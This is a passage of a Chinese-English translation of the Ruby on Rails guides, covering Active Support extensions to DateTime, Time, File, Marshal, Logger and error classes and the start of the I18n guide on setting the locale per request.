date = DateTime.new(2010, 6, 7, 19, 55, 25)
date.beginning_of_minute # => Mon Jun 07 19:55:00 +0200 2010

The method end_of_minute returns a timestamp at the end of the minute (hh:mm:59):
date = DateTime.new(2010, 6, 7, 19, 55, 25)
date.end_of_minute # => Mon Jun 07 19:55:59 +0200 2010

beginning_of_minute is aliased to at_beginning_of_minute.

beginning_of_hour, end_of_hour, beginning_of_minute and end_of_minute are implemented for Time and DateTime but not Date as it does not make sense to request the beginning or end of an hour or minute on a Date instance.
#####  15.1.6.4 ago, since 几天之前

The method ago receives a number of seconds as argument and returns a timestamp those many seconds ago from midnight:
date = Date.current # => Fri, 11 Jun 2010
date.ago(1)         # => Thu, 10 Jun 2010 23:59:59 EDT -04:00

Similarly, since moves forward:
date = Date.current # => Fri, 11 Jun 2010
date.since(1)       # => Fri, 11 Jun 2010 00:00:01 EDT -04:00
15.1.7 Other Time Computations  其他时间计算
###  15.2 Conversions   转换类型
##  16 Extensions to DateTime 日期时间的扩展

DateTime is not aware of DST rules and so some of these methods have edge cases when a DST change is going on. For example seconds_since_midnight might not return the real amount in such a day.
###  16.1 Calculations  计算

All the following methods are defined in active_support/core_ext/date_time/calculations.rb.

The class DateTime is a subclass of Date so by loading active_support/core_ext/date/calculations.rb you inherit these methods and their aliases, except that they will always return datetimes:
yesterday
tomorrow
beginning_of_week (at_beginning_of_week)
end_of_week (at_end_of_week)
monday
sunday
weeks_ago
prev_week (last_week)
next_week
months_ago
months_since
beginning_of_month (at_beginning_of_month)
end_of_month (at_end_of_month)
prev_month (last_month)
next_month
beginning_of_quarter (at_beginning_of_quarter)
end_of_quarter (at_end_of_quarter)
beginning_of_year (at_beginning_of_year)
end_of_year (at_end_of_year)
years_ago
years_since
prev_year (last_year)
next_year

The following methods are reimplemented so you do not need to load active_support/core_ext/date/calculations.rb for these ones:
beginning_of_day (midnight, at_midnight, at_beginning_of_day)
end_of_day
ago
since (in)

On the other hand, advance and change are also defined and support more options, they are documented below.

The following methods are only implemented in active_support/core_ext/date_time/calculations.rb as they only make sense when used with a DateTime instance:
beginning_of_hour (at_beginning_of_hour)
end_of_hour
16.1.1 Named Datetimes   已命名日期时间
#####  16.1.1.1 DateTime.current 当前日期时间

Active Support defines DateTime.current to be like Time.now.to_datetime, except that it honors the user time zone, if defined. It also defines DateTime.yesterday and DateTime.tomorrow, and the instance predicates past?, and future? relative to DateTime.current.
16.1.2 Other Extensions   其他扩展
#####  16.1.2.1 seconds_since_midnight 离午夜多少秒

The method seconds_since_midnight returns the number of seconds since midnight:
now = DateTime.current     # => Mon, 07 Jun 2010 20:26:36 +0000
now.seconds_since_midnight # => 73596
#####  16.1.2.2 utc 世界时

The method utc gives you the same datetime in the receiver expressed in UTC.
now = DateTime.current # => Mon, 07 Jun 2010 19:27:52 -0400
now.utc                # => Mon, 07 Jun 2010 23:27:52 +0000

This method is also aliased as getutc.
#####  16.1.2.3 utc? 是否世界时

The predicate utc? says whether the receiver has UTC as its time zone:
now = DateTime.now # => Mon, 07 Jun 2010 19:30:47 -0400
now.utc?           # => false
now.utc.utc?       # => true
#####  16.1.2.4 advance 高级用法

The most generic way to jump to another datetime is advance. This method receives a hash with keys :years, :months, :weeks, :days, :hours, :minutes, and :seconds, and returns a datetime advanced as much as the present keys indicate.
d = DateTime.current
# => Thu, 05 Aug 2010 11:33:31 +0000
d.advance(years: 1, months: 1, days: 1, hours: 1, minutes: 1, seconds: 1)
# => Tue, 06 Sep 2011 12:34:32 +0000

This method first computes the destination date passing :years, :months, :weeks, and :days to Date#advance documented above. After that, it adjusts the time calling since with the number of seconds to advance. This order is relevant, a different ordering would give different datetimes in some edge-cases. The example in Date#advance applies, and we can extend it to show order relevance related to the time bits.

If we first move the date bits (that have also a relative order of processing, as documented before), and then the time bits we get for example the following computation:
d = DateTime.new(2010, 2, 28, 23, 59, 59)
# => Sun, 28 Feb 2010 23:59:59 +0000
d.advance(months: 1, seconds: 1)
# => Mon, 29 Mar 2010 00:00:00 +0000

but if we computed them the other way around, the result would be different:
d.advance(seconds: 1).advance(months: 1)
# => Thu, 01 Apr 2010 00:00:00 +0000

Since DateTime is not DST-aware you can end up in a non-existing point in time with no warning or error telling you so.
16.1.3 Changing Components   更改时间的部分

The method change allows you to get a new datetime which is the same as the receiver except for the given options, which may include :year, :month, :day, :hour, :min, :sec, :offset, :start:
now = DateTime.current
# => Tue, 08 Jun 2010 01:56:22 +0000
now.change(year: 2011, offset: Rational(-6, 24))
# => Wed, 08 Jun 2011 01:56:22 -0600

If hours are zeroed, then minutes and seconds are too (unless they have given values):
now.change(hour: 0)
# => Tue, 08 Jun 2010 00:00:00 +0000

Similarly, if minutes are zeroed, then seconds are too (unless it has given a value):
now.change(min: 0)
# => Tue, 08 Jun 2010 01:00:00 +0000

This method is not tolerant to non-existing dates, if the change is invalid ArgumentError is raised:
DateTime.current.change(month: 2, day: 30)
# => ArgumentError: invalid date
16.1.4 Durations   期间

Durations can be added to and subtracted from datetimes:
now = DateTime.current
# => Mon, 09 Aug 2010 23:15:17 +0000
now + 1.year
# => Tue, 09 Aug 2011 23:15:17 +0000
now - 1.week
# => Mon, 02 Aug 2010 23:15:17 +0000

They translate to calls to since or advance. For example here we get the correct jump in the calendar reform:
DateTime.new(1582, 10, 4, 23) + 1.hour
# => Fri, 15 Oct 1582 00:00:00 +0000
##  17 Extensions to Time 对时间的扩展
###  17.1 Calculations  极端

All the following methods are defined in active_support/core_ext/time/calculations.rb.

Active Support adds to Time many of the methods available for DateTime:
past?
today?
future?
yesterday
tomorrow
seconds_since_midnight
change
advance
ago
since (in)
beginning_of_day (midnight, at_midnight, at_beginning_of_day)
end_of_day
beginning_of_hour (at_beginning_of_hour)
end_of_hour
beginning_of_week (at_beginning_of_week)
end_of_week (at_end_of_week)
monday
sunday
weeks_ago
prev_week (last_week)
next_week
months_ago
months_since
beginning_of_month (at_beginning_of_month)
end_of_month (at_end_of_month)
prev_month (last_month)
next_month
beginning_of_quarter (at_beginning_of_quarter)
end_of_quarter (at_end_of_quarter)
beginning_of_year (at_beginning_of_year)
end_of_year (at_end_of_year)
years_ago
years_since
prev_year (last_year)
next_year

They are analogous. Please refer to their documentation above and take into account the following differences:

    change accepts an additional :usec option.
    Time understands DST, so you get correct DST calculations as in

Time.zone_default
# => #<ActiveSupport::TimeZone:0x7f73654d4f38 @utc_offset=nil, @name="Madrid", ...>
 
# In Barcelona, 2010/03/28 02:00 +0100 becomes 2010/03/28 03:00 +0200 due to DST.
t = Time.local(2010, 3, 28, 1, 59, 59)
# => Sun Mar 28 01:59:59 +0100 2010
t.advance(seconds: 1)
# => Sun Mar 28 03:00:00 +0200 2010

    If since or ago jump to a time that can't be expressed with Time a DateTime object is returned instead.

17.1.1 Time.current 当前时间

Active Support defines Time.current to be today in the current time zone. That's like Time.now, except that it honors the user time zone, if defined. It also defines the instance predicates past?, today?, and future?, all of them relative to Time.current.

When making Time comparisons using methods which honor the user time zone, make sure to use Time.current instead of Time.now. There are cases where the user time zone might be in the future compared to the system time zone, which Time.now uses by default. This means Time.now.to_date may equal Date.yesterday.
17.1.2 all_day, all_week, all_month, all_quarter and all_year 一天周月季年的区间

The method all_day returns a range representing the whole day of the current time.
now = Time.current
# => Mon, 09 Aug 2010 23:20:05 UTC +00:00
now.all_day
# => Mon, 09 Aug 2010 00:00:00 UTC +00:00..Mon, 09 Aug 2010 23:59:59 UTC +00:00

Analogously, all_week, all_month, all_quarter and all_year all serve the purpose of generating time ranges.
now = Time.current
# => Sun, 16 Sep 2012 00:00:00 UTC +00:00..Sat, 22 Sep 2012 23:59:59 UTC +00:00
now.all_month
# => Sat, 01 Aug 2010 00:00:00 UTC +00:00..Tue, 31 Aug 2010 23:59:59 UTC +00:00
now.all_quarter
# => Thu, 01 Jul 2010 00:00:00 UTC +00:00..Thu, 30 Sep 2010 23:59:59 UTC +00:00
now.all_year
# => Fri, 01 Jan 2010 00:00:00 UTC +00:00..Fri, 31 Dec 2010 23:59:59 UTC +00:00
###  17.2 Time Constructors  时间构造器

Active Support defines Time.current to be Time.zone.now if there's a user time zone defined, with fallback to Time.now:
Time.zone_default
# => #<ActiveSupport::TimeZone:0x7f73654d4f38 @utc_offset=nil, @name="Madrid", ...>
Time.current
# => Fri, 06 Aug 2010 17:11:58 CEST +02:00

Analogously to DateTime, the predicates past?, and future? are relative to Time.current.

If the time to be constructed lies beyond the range supported by Time in the runtime platform, usecs are discarded and a DateTime object is returned instead.
17.2.1 Durations  期间

Durations can be added to and subtracted from time objects:
now = Time.current
# => Mon, 09 Aug 2010 23:20:05 UTC +00:00
now + 1.year
#  => Tue, 09 Aug 2011 23:21:11 UTC +00:00
now - 1.week
# => Mon, 02 Aug 2010 23:21:11 UTC +00:00

They translate to calls to since or advance. For example here we get the correct jump in the calendar reform:
Time.utc(1582, 10, 3) + 5.days
# => Mon Oct 18 00:00:00 UTC 1582
##  18 Extensions to File 对文件的扩展
###  18.1 atomic_write 原子写入

With the class method File.atomic_write you can write to a file in a way that will prevent any reader from seeing half-written content.

The name of the file is passed as an argument, and the method yields a file handle opened for writing. Once the block is done atomic_write closes the file handle and completes its job.

For example, Action Pack uses this method to write asset cache files like all.css:
File.atomic_write(joined_asset_path) do |cache|
  cache.write(join_asset_file_contents(asset_paths))
end

To accomplish this atomic_write creates a temporary file. That's the file the code in the block actually writes to. On completion, the temporary file is renamed, which is an atomic operation on POSIX systems. If the target file exists atomic_write overwrites it and keeps owners and permissions. However there are a few cases where atomic_write cannot change the file ownership or permissions, this error is caught and skipped over trusting in the user/filesystem to ensure the file is accessible to the processes that need it.

Due to the chmod operation atomic_write performs, if the target file has an ACL set on it this ACL will be recalculated/modified.

Note you can't append with atomic_write.

The auxiliary file is written in a standard directory for temporary files, but you can pass a directory of your choice as second argument.

定义于 active_support/core_ext/file/atomic.rb.
##  19 Extensions to Marshal 对序列化的扩展
###  19.1 load 装载

Active Support adds constant autoloading support to load.

For example, the file cache store deserializes this way:
File.open(file_name) { |f| Marshal.load(f) }

If the cached data refers to a constant that is unknown at that point, the autoloading mechanism is triggered and if it succeeds the deserialization is retried transparently.

If the argument is an IO it needs to respond to rewind to be able to retry. Regular files respond to rewind.

定义于 active_support/core_ext/marshal.rb.
##  20 Extensions to Logger 对日志的扩展
###  20.1 around_[level] 环绕级别

Takes two arguments, a before_message and after_message and calls the current level method on the Logger instance, passing in the before_message, then the specified message, then the after_message:
logger = Logger.new("log/development.log")
logger.around_info("before", "after") { |logger| logger.info("during") }
###  20.2 silence 静默

Silences every log level lesser to the specified one for the duration of the given block. Log level orders are: debug, info, error and fatal.
logger = Logger.new("log/development.log")
logger.silence(Logger::INFO) do
  logger.debug("In space, no one can hear you scream.")
  logger.info("Scream all you want, small mailman!")
end
###  20.3 datetime_format= 指定日期时间格式

Modifies the datetime format output by the formatter class associated with this logger. If the formatter class does not have a datetime_format method then this is ignored.
class Logger::FormatWithTime < Logger::Formatter
  cattr_accessor(:datetime_format) { "%Y%m%d%H%m%S" }
 
  def self.call(severity, timestamp, progname, msg)
    "#{timestamp.strftime(datetime_format)} -- #{String === msg ? msg : msg.inspect}\n"
  end
end
 
logger = Logger.new("log/development.log")
logger.formatter = Logger::FormatWithTime
logger.info("<- is the current time")

定义于 active_support/core_ext/logger.rb.
##  21 Extensions to NameError 对名称错误的扩展

Active Support adds missing_name? to NameError, which tests whether the exception was raised because of the name passed as argument.

The name may be given as a symbol or string. A symbol is tested against the bare constant name, a string is against the fully-qualified constant name.

A symbol can represent a fully-qualified constant name as in :"ActiveRecord::Base", so the behavior for symbols is defined for convenience, not because it has to be that way technically.

For example, when an action of ArticlesController is called Rails tries optimistically to use ArticlesHelper. It is OK that the helper module does not exist, so if an exception for that constant name is raised it should be silenced. But it could be the case that articles_helper.rb raises a NameError due to an actual unknown constant. That should be reraised. The method missing_name? provides a way to distinguish both cases:
def default_helper_module!
  module_name = name.sub(/Controller$/, '')
  module_path = module_name.underscore
  helper module_path
rescue MissingSourceFile => e
  raise e unless e.is_missing? "helpers/#{module_path}_helper"
rescue NameError => e
  raise e unless e.missing_name? "#{module_name}Helper"
end

定义于 active_support/core_ext/name_error.rb.
##  22 Extensions to LoadError 对装载错误的扩展

Active Support adds is_missing? to LoadError, and also assigns that class to the constant MissingSourceFile for backwards compatibility.

Given a path name is_missing? tests whether the exception was raised due to that particular file (except perhaps for the ".rb" extension).

For example, when an action of ArticlesController is called Rails tries to load articles_helper.rb, but that file may not exist. That's fine, the helper module is not mandatory so Rails silences a load error. But it could be the case that the helper module does exist and in turn requires another library that is missing. In that case Rails must reraise the exception. The method is_missing? provides a way to distinguish both cases:
def default_helper_module!
  module_name = name.sub(/Controller$/, '')
  module_path = module_name.underscore
  helper module_path
rescue MissingSourceFile => e
  raise e unless e.is_missing? "helpers/#{module_path}_helper"
rescue NameError => e
  raise e unless e.missing_name? "#{module_name}Helper"
end

定义于 active_support/core_ext/load_error.rb.

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Rails 国际化 API

Rails 内建支持 Ruby I18n（internationalization 的简写）。Ruby I18n 这个 gem 用法简单，是个扩展性强的框架，可以把程序翻译成英语之外的其他语言，或者为程序提供多种语言支持。

“国际化”是指把程序中的字符串或者其他需要本地化的内容（例如，日期和货币的格式）提取出来的过程。“本地化”是指把提取出来的内容翻译成本地语言或者本地所用格式的过程。

所以在 Rails 程序国际化的过程中要做这些事情：

    确保程序支持 i18n；
    告诉 Rails 在哪里寻找本地语言包；
    告诉 Rails 怎么设置、保存和切换本地语言包；

在本地化程序的过程中或许要做以下三件事：

    修改或提供 Rails 默认使用的本地语言包，例如，日期和时间的格式、月份名、Active Record 模型名等；
    把程序中的字符串提取出来，保存到键值对中，例如 Flash 消息、视图中的纯文本等；
    在某个地方保存语言包；

本文会详细介绍 I18n API，并提供一个教程，演示如何从头开始国际化一个 Rails 程序。

读完本文，你将学到：

    Ruby on Rails 是如何处理 i18n 的；
    如何在 REST 架构的程序中正确使用 i18n；
    如何使用 i18n 翻译 ActiveRecord 错误和 ActionMailer E-mail；
    协助翻译程序的工具；

Chapters

    Ruby on Rails 是如何处理 i18n 的
        Ruby I18n 的整体架构
        公开 API
    为国际化做准备
        配置 I18n 模块
        （选做）更改 I18n 库的设置
        设置并传入所用语言
        使用不同的域名加载不同的语言
        在 URL 参数中设置所用语言
        从客户端提供的信息设置Locale
    国际化应用程序
        增加翻译
        将变量传递到翻译
        增加日期/时间格式
        为其他Locales增加变形规则
        视图的国际化
        Locale文件的组织
    浏览I18n API的特性
        查找翻译
        插入补充
        复数形式
        设置并传递一个Locale
        使用安全HTML翻译
    怎么存储自定义翻译
        Active Record 模型的翻译
        Action Mailer E-Mail主题的翻译
        浏览其他支持国际化的内建方法
    自定义I18n设置
        使用不同的后台
        使用不同的异常处理
    总结
    为Rails I18n做贡献
    参考资源
    作者
    脚注

Ruby I18n 框架提供了 Rails 程序国际化和本地化所需的各种功能。不过，还可以使用各种插件和扩展，添加额外的功能。详情参见 Ruby I18n 的维基。
##  1 Ruby on Rails 是如何处理 i18n 的

国际化是个很复杂的问题。自然语言千差万别（例如复数变形规则），很难提供一种工具解决所有问题。因此，Rails I18n API 只关注：

    默认支持和英语类似的语言；
    让支持其他语言变得简单；

Rails 框架中的每个静态字符串（例如，Active Record 数据验证消息，日期和时间的格式）都支持国际化，因此本地化时只要重写默认值即可。
###  1.1 Ruby I18n 的整体架构

Ruby I18n 分成两部分：

    公开的 API：这是一个 Ruby 模块，定义了库中可用的公开方法；
    一个默认的后台（特意取名为“Simple”），实现这些方法；

普通用户只要使用这些公开方法即可，但了解后台的功能也有助于使用 i18n API。

默认提供的“Simple”后台可以用其他强大的后台替代（推荐这么做），例如把翻译后的数据存储在关系型数据库中，或 GetText 语言包中。详情参见下文的“使用其他后台”一节。
###  1.2 公开 API

I18n API 最重要的方法是：
translate # Lookup text translations 查找翻译文本
localize  # Localize Date and Time objects to local formats
# 将日期和时间转为本地区格式

这两个方法都有别名，分别为 #t 和 #l。因此可以这么用：
I18n.t 'store.title'
I18n.l Time.now

I18n API 同时还提供了针对下述属性的读取和设值方法：
load_path         # Announce your custom translation files
# 声明自定义翻译文件
locale            # Get and set the current locale
# 取得、设置当前地区
default_locale    # Get and set the default locale
# 取得、设置默认地区
exception_handler # Use a different exception_handler
# 使用一个不同的异常处理器
backend           # Use a different backend
# 使用一个不同的后台

下一节起，我们要从零开始国际化一个简单的 Rails 程序。
##  2 为国际化做准备

为程序提供 I18n 支持只需简单几步。
###  2.1 配置 I18n 模块

按照“多约定，少配置”原则，Rails 会为程序提供一些合理的默认值。如果想使用其他设置，可以很容易的改写默认值。

Rails 会自动把 config/locales 文件夹中所有 .rb 和 .yml 文件加入译文加载路径。

默认提供的 en.yml 文件中包含一些简单的翻译文本：
en:
  hello: "Hello world"

上面这段代码的意思是，在 :en 语言中，hello 键映射到字符串 "Hello world" 上。Rails 中的每个字符串的国际化都使用这种方式，比如说 Active Model 数据验证消息以及日期和时间格式。在默认的后台中，可以使用 YAML 或标准的 Ruby Hash 存储翻译数据。

I18n 库使用的默认语言是英语，所以如果没设为其他语言，就会用 :en 查找翻译数据。

经过讨论之后，i18n 库决定为语言名称使用一种务实的方案，只说明所用语言（例如，:en，:pl），不区分地区（例如，:en-US，:en-GB）。地区经常用来区分同一语言在不同地区的分支或者方言。很多国际化程序只使用语言名称，例如 :cs、:th 和 :es（分别为捷克语，泰语和西班牙语）。不过，同一语种在不同地区可能有重要差别。例如，在 :en-US 中，货币符号是“$”，但在 :en-GB 中是“£”。在 Rails 中使用区分地区的语言设置也是可行的，只要在 :en-GB 中使用完整的“English - United Kingdom”即可。很多 Rails I18n 插件，例如 Globalize3，都可以实现。

译文加载路径（I18n.load_path）是一个 Ruby 数组，由译文文件的路径组成，Rails 程序会自动加载这些文件。你可以使用任何一个文件夹，任何一种文件命名方式。

首次加载查找译文时，后台会惰性加载这些译文。这么做即使已经声明过，也可以更换所用后台。

application.rb 文件中的默认内容有介绍如何从其他文件夹中添加本地数据，以及如何设置默认使用的语言。去掉相关代码行前面的注释，修改即可。
# The default locale is :en and all translations from config/locales/*.rb,yml are auto loaded.
# config.i18n.load_path += Dir[Rails.root.join('my', 'locales', '*.{rb,yml}').to_s]
# config.i18n.default_locale = :de
###  2.2 （选做）更改 I18n 库的设置

如果基于某些原因不想使用 application.rb 文件中的设置，我们来介绍一下手动设置的方法。

告知 I18n 库在哪里寻找译文文件，可以在程序的任何地方指定加载路径。但要保证这个设置要在加载译文之前执行。我们可能还要修改默认使用的语言。要完成这两个设置，最简单的方法是把下面的代码放到一个初始化脚本中：
# in config/initializers/locale.rb
 
# tell the I18n library where to find your translations
I18n.load_path += Dir[Rails.root.join('lib', 'locale', '*.{rb,yml}')]
 
# set default locale to something other than :en
I18n.default_locale = :pt
###  2.3 设置并传入所用语言

如果想把 Rails 程序翻译成英语（默认语言）之外的其他语言，可以在 application.rb 文件或初始化脚本中设置 I18n.default_locale 选项。这个设置对所有请求都有效。

不过，或许你希望为程序提供多种语言支持。此时，需要在请求中指定所用语言。

你可能想过把用户选择适用的语言保存在会话或 cookie 中，请千万别这么做。所用语言应该是透明的，写在 URL 中。这样做不会破坏用户对网页内容的预想，如果把 URL 发给一个朋友，他应该看到和我相同的内容。这种方式在 REST 架构中很容易实现。不过也有不适用 REST 架构的情况，后文会说明。

设置所用语言的方法很简单，只需在 ApplicationController 的 before_action 中作如下设定即可：
before_action :set_locale
 
def set_locale
  I18n.locale = params[:locale] || I18n.default_locale
end

使用这种方法要把语言作为 URL 查询参数传入，例如 http://example.com/books?locale=pt（这是 Google 使用的方法）。http://localhost:3000?locale=pt 会加载葡萄牙语，http://localhost:3000?locale=de 会加载德语，以此类推。如果想手动在 URL 中指定语言再刷新页面，可以跳过后面几小节，直接阅读“国际化程序”一节。

当然了，你可能并不想手动在每个 URL 中指定语言，或者想使用其他形式的 URL，例如 http://example.com/pt/books 或 http://example.com/en/books。下面分别介绍其他各种设置语言的方法。
###  2.4 使用不同的域名加载不同的语言

设置所用语言可以通过不同的域名实现。例如，www.example.com 加载英语内容，www.example.es 加载西班牙语内容。这里使用的是不同的顶级域名。这么做有多个好处：

    所用语言在 URL 中很明显；
    用户很容易得知所查看内容使用的语言；
    在 Rails 中可以轻松实现；
    搜索引擎似乎喜欢把不同语言的内容放在不同但相互关联的域名上；

在 ApplicationController 中加入如下代码可以实现这种处理方式：
before_action :set_locale
 
def set_locale
  I18n.locale = extract_locale_from_tld || I18n.default_locale
end
 
# Get locale from top-level domain or return nil if such locale is not available
# 从顶级域名里获取地区信息，如果没有该地区信息，则返回nil。
# You have to put something like:
# 你需要在/etc/hosts文件里放入类似下面的代码，尝试其他地区：
#   127.0.0.1 application.com
#   127.0.0.1 application.it
#   127.0.0.1 application.pl
# in your /etc/hosts file to try this out locally
def extract_locale_from_tld
  parsed_locale = request.host.split('.').last
  I18n.available_locales.include?(parsed_locale.to_sym) ? parsed_locale : nil
end

类似地，还可以使用不同的二级域名提供不同语言的内容：
# Get locale code from request subdomain (like
http://it.application.local:3000)
# 从请求的子域名（像http://it.application.local:3000）中获取地区代码。
# You have to put something like:
# 你需要在/etc/hosts文件里放入类似下面的代码，尝试其他地区：
#   127.0.0.1 gr.application.local
# in your /etc/hosts file to try this out locally
def extract_locale_from_subdomain
  parsed_locale = request.subdomains.first
  I18n.available_locales.include?(parsed_locale.to_sym) ? parsed_locale : nil
end

如果程序中需要切换语言的连接，可以这么写：
link_to("Deutsch", "#{APP_CONFIG[:deutsch_website_url]}#{request.env['REQUEST_URI']}")

上述代码假设 APP_CONFIG[:deutsch_website_url] 的值为 http://www.application.de。

这种方法虽有种种好处，但你或许不想在不同的域名上提供不同语言的内容。最好的实现方式肯定是在 URL 的参数中加上语言代码。
###  2.5 在 URL 参数中设置所用语言

The most usual way of setting (and passing) the locale would be to include it in URL params, as we did in the I18n.locale = params[:locale] before_action in the first example. We would like to have URLs like www.example.com/books?locale=ja or www.example.com/ja/books in this case.                                                                                                                                                  设置（和传递）locale最常见的方法是在URL参数里包含它，就像第一个例子上的`I18n.locale = params[:locale]`的before_action过滤器那样。                                                                             必须让URL变成`www.example.com/books?locale=ja`和这个例子的`www.example.com/ja/books`那样。

This approach has almost the same set of advantages as setting the locale from the domain name: namely that it's RESTful and in accord with the rest of the World Wide Web. It does require a little bit more work to implement, though.                                                                                                   和从域名设置locale的方式相比，这种方式也拥有大部分一样的便利：比如RESTful，与万维网一致。 虽然这种方式实现起来要求多一点。

Getting the locale from params and setting it accordingly is not hard; including it in every URL and thus passing it through the requests is. To include an explicit option in every URL (e.g. link_to( books_url(locale: I18n.locale))) would be tedious and probably impossible, of course.                                                                                                                                               在参数中获取locale并进行设置，不难；每个URL都包含它。当然，在每个URL中都包含一个显式的选项（例如link_to( books_url(locale: I18n.locale))），是非常麻烦的，或许还容易疏忽。

Rails contains infrastructure for "centralizing dynamic decisions about the URLs" in its ApplicationController#default_url_options, which is useful precisely in this scenario: it enables us to set "defaults" for url_for and helper methods dependent on it (by implementing/overriding this method).                                                                                            Rails在它的ApplicationController#default_url_options中包含了“URL集中化动态决定”基础架构，在某些情况下十分有用：允许我们为url_for 和依赖它的辅助方法（通过实现或改写这个方法）设置“默认”选项。

We can include something like this in our ApplicationController then:                                      可以包含一些类似如下的代码在程序控制器中。
# app/controllers/application_controller.rb
def default_url_options(options={})
  logger.debug "default_url_options is passed options: #{options.inspect}\n"
  { locale: I18n.locale }
end

Every helper method dependent on url_for (e.g. helpers for named routes like root_path or root_url, resource routes like books_path or books_url, etc.) will now automatically include the locale in the query string, like this: http://localhost:3001/?locale=ja.                         每个依赖url_for的帮助方法（比如命名路由的辅助器，例如root_path或者root_url，资源路由的辅助器，例如books_path或books_url，等等），现在都在查询字符串中自动包含了locale，比如这个` http://localhost:3001/?locale=ja`。

You may be satisfied with this. It does impact the readability of URLs, though, when the locale "hangs" at the end of every URL in your application. Moreover, from the architectural standpoint, locale is usually hierarchically above the other parts of the application domain: and URLs should reflect this.                                                                                                                                         满意了吧。但这确实影响了URL的可读性，locale“悬挂”在程序里每个URL的末端。还有，从构建的视角看，locale是分层级的，它应该在程序域名的其他部分之上：URL应该反映这一点。

You probably want URLs to look like this: www.example.com/en/books (which loads the English locale) and www.example.com/nl/books (which loads the Dutch locale). This is achievable with the "over-riding default_url_options" strategy from above: you just have to set up your routes with scoping option in this way:                                                                                                        你可能想让URL看起来像`www.example.com/en/books`（导入英语locale）和`www.example.com/nl/books`（导入丹麦locale）。在上面使用`over-riding default_url_options`策略，就可以了：只要用下面这种带`scoping`选项的方法设置路由。
# config/routes.rb
scope "/:locale" do
  resources :books
end

Now, when you call the books_path method you should get "/en/books" (for the default locale). An URL like http://localhost:3001/nl/books should load the Dutch locale, then, and following calls to books_path should return "/nl/books" (because the locale changed).                             现在调用`books_path`方法，应该得到`/en/books`（默认locale）的地址了。类似`http://localhost:3001/nl/books`的URL将加载丹麦的locale，下面调用books_path将返回“/nl/books”（因为locale已经变了）

If you don't want to force the use of a locale in your routes you can use an optional path scope (denoted by the parentheses) like so:                                                                                                如果不想强制在路由中强制使用locale，可以像下面那样使用可选的路径scope（用圆括号表示）。
# config/routes.rb
scope "(:locale)", locale: /en|nl/ do
  resources :books
end

With this approach you will not get a Routing Error when accessing your resources such as http://localhost:3001/books without a locale. This is useful for when you want to use the default locale when one is not specified.                                                                                            如果使用这种方式，当类似`http://localhost:3001/books`这样不带locale的请求访问资源时，不会抛出`Routing Error `的异常。这很有用，当请求没有指定locale时，就会使用默认的locale。

Of course, you need to take special care of the root URL (usually "homepage" or "dashboard") of your application. An URL like http://localhost:3001/nl will not work automatically, because the root to: "books#index" declaration in your routes.rb doesn't take locale into account. (And rightly so: there's only one "root" URL.)                                                                                     当然，这就需要小心对象程序的根地址（一般是“homepage”或“dashboard”）了。一个类似http://localhost:3001/nl的地址将不能通过路由，因为routes.rb中已经root to: "books#index"的声明没有考虑带locale。

You would probably need to map URLs like these:                                                                             可能需要这样映射地址：
# config/routes.rb
get '/:locale' => 'dashboard#index'

Do take special care about the order of your routes, so this route declaration does not "eat" other ones. (You may want to add it directly before the root :to declaration.)                                         还要特别小心路由的顺序，别让这个路由声明“吃”了其他的声明（你可能想直接将这一行添加在root :to声明的前面）。

Have a look at two plugins which simplify work with routes in this way: Sven Fuchs's routing_filter and Raul Murciano's translate_routes. 看看两个用这种方式简化路由工作的插件：Sven Fuchs的routing_filter ，Raul Murciano的translate_routes。
###  2.6 Setting the Locale from the Client Supplied Information   用客户端提供的信息设置locale

In specific cases, it would make sense to set the locale from client-supplied information, i.e. not from the URL. This information may come for example from the users' preferred language (set in their browser), can be based on the users' geographical location inferred from their IP, or users can provide it simply by choosing the locale in your application interface and saving it to their profile. This approach is more suitable for web-based applications or services, not for websites - see the box about sessions, cookies and RESTful architecture above.                                                          在特定情形下，用客户端提供的信息设置locale会更有意义。这些信息可能来自，比如用户的语言偏好（在他们的浏览器中设定），基于ip地址所涉及的用户地理位置，或者只是程序界面让用户选择locale，然后保存到他们的配置中。这个方式更适合基于web的程序或服务，不适合网站——看看上面有关会话、甜饼和RESTful架构的讨论。
####  2.6.1 Using Accept-Language 使用“可接受语言”

One source of client supplied information would be an Accept-Language HTTP header. People may set this in their browser or other clients (such as curl).                                                              客户端提供的信息之一，是HTTP头的Accept-Language。人们可能在浏览器或其他客户端（比如curl）设置了这个。

A trivial implementation of using an Accept-Language header would be:                                         利用可接受语言标头的实现为：
def set_locale
  logger.debug "* Accept-Language: #{request.env['HTTP_ACCEPT_LANGUAGE']}"
  I18n.locale = extract_locale_from_accept_language_header
  logger.debug "* Locale set to '#{I18n.locale}'"
end
 
private
  def extract_locale_from_accept_language_header
    request.env['HTTP_ACCEPT_LANGUAGE'].scan(/^[a-z]{2}/).first
  end

Of course, in a production environment you would need much more robust code, and could use a plugin such as Iain Hecker's http_accept_language or even Rack middleware such as Ryan Tomayko's locale.                                                                                                                                当然，在生产环境中需要更多的代码，可以使用插件，例如ain Hecker的http_accept_language，或者使用Rack中间件，例如Ryan Tomayko的locale。
####  2.6.2 Using GeoIP (or Similar) Database  使用GeoIP或者类似的数据库

Another way of choosing the locale from client information would be to use a database for mapping the client IP to the region, such as GeoIP Lite Country. The mechanics of the code would be very similar to the code above - you would need to query the database for the user's IP, and look up your preferred locale for the country/region/city returned.                                                                 根据客户端信息选择locale的另一种方式，是使用数据库来将客户端IP映射到地区中，例如GeoIP Lite Country。该代码的机制很像上面的代码——需要在数据库对用户IP地址进行查询，为返回的国家/地区/城市找到最有可能的locale。
####  2.6.3 User Profile 使用用户配置

You can also provide users of your application with means to set (and possibly over-ride) the locale in your application interface, as well. Again, mechanics for this approach would be very similar to the code above - you'd probably let users choose a locale from a dropdown list and save it to their profile in the database. Then you'd set the locale to this value.                                                            也可以在程序界面中允许用户设置（或者改变）locale。这种方式的机制也和上面的代码很像——可能让用户在一个下拉菜单中选择一个locale，然后将locale保存到数据库中，进而将locale设置为该值。
##  3 Internationalizing your Application 程序的国际化

